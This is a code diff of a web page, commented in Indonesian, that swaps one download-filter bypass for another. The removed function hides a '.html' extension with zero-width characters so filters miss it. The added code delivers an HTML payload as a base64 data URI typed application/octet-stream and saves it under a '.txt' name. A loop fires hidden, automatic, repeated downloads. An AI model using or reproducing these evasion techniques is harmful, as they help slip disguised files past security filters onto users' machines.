@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Invisible Character Bypass</title>
+<title>MIME Confusion via Data URI</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Invisible Character Bypass</h2>
-<p>Menyamarkan ekstensi .html dengan menyisipkan Zero-Width Character.</p>
+<h2>MIME Confusion (Data URI)</h2>
+<p>Mengunduh file tanpa ekstensi .html, namun merender HTML via Data URI.</p>
 
 <button id="start-btn" type="button">Mulai Generate Blob</button>
 <div id="status" role="status">Sistem siap.</div>
@@ -47,18 +47,6 @@ const speak = (message) => {
         window.speechSynthesis.speak(utterance);
     }
 };
-
-// Fungsi untuk menyisipkan Invisible Character
-function generateInvisibleFilename(baseName) {
-    // Zero-Width Space (U+200B) dan Zero-Width Non-Joiner (U+200C)
-    const zwsp = "\u200B"; 
-    const zwnj = "\u200C";
-    
-    // Nama file: nama_asli.txt[ZWS].html[ZWNJ]
-    // Tujuannya agar filter tidak mendeteksi ".html" secara literal
-    // Visualnya: nama_asli.txt.html
-    return `${baseName}.txt${zwsp}.html${zwnj}`;
-}
 
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
@@ -131,9 +119,12 @@ const prepareMimeBlobAsync = (i) => {
             "</body>" +
             "</html>";
           
-            const blob = new Blob([payloadText], { type: "text/html" });
-            const url = URL.createObjectURL(blob);
-            resolve({ id: i, url: url });
+            // TRIK: Menggunakan Data URI alih-alih Blob URL
+            const dataUri = 'data:application/octet-stream;base64,' + btoa(unescape(encodeURIComponent(payloadText)));
+            
+            // Kita simpan data URI di activeUrls untuk pelacakan
+            activeUrls.push(dataUri);
+            resolve({ id: i, url: dataUri });
         });
     });
 };
@@ -142,10 +133,10 @@ const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
     
-    // Terapkan Invisible Filename
-    link.download = generateInvisibleFilename(`laporan-${fileData.id}`);
+    // TANPA EKSTENSI .html SAMA SEKALI
+    link.download = `laporan-${fileData.id}.txt`; 
     
-    link.textContent = `Blob #${fileData.id} (Invisible)`;
+    link.textContent = `Blob #${fileData.id} (.txt)`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
@@ -155,8 +146,7 @@ const processLoop = async (counter) => {
     if (!isProcessing) return;
 
     const fileData = await prepareMimeBlobAsync(counter);
-    activeUrls.push(fileData.url);
-
+    
     triggerInstantDownload(fileData);
 
     statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
@@ -177,7 +167,6 @@ const processLoop = async (counter) => {
 startBtn.addEventListener("click", () => {
     if (isProcessing) return;
 
-    activeUrls.forEach(url => URL.revokeObjectURL(url));
     activeUrls = [];
     downloadsDiv.replaceChildren();
 
@@ -199,7 +188,7 @@ startBtn.addEventListener("click", () => {
 
     setTimeout(() => {
         isProcessing = true;
-        speak("Proses pembuatan berkas Blob dimulai.");
+        speak("Proses pembuatan berkas dimulai.");
         processLoop(1);
     }, 300);
 });
